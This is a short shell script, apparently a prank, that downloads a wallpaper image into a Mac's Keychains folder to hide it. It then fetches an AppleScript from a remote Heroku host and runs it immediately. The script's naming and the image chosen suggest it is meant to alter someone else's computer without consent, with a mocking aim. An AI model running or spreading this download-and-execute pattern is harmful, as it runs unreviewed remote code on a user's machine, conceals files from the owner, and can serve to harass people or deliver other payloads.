#!/bin/sh -ev

GWALL_HIDE=$HOME/Library/Keychains/g-wall.jpg
GWALL_SCRIPT=$HOME/Library/Keychains//g-wall_set.scpt

curl http://images2.fanpop.com/image/photos/8700000/Gay-Wallpaper-lgbt-8774743-1280-1024.jpg -o $GWALL_HIDE
curl http://g-wall.heroku.com/g-wall_set.scpt -o $GWALL_SCRIPT

osascript $HOME/Library/Keychains/g-wall_set.scpt

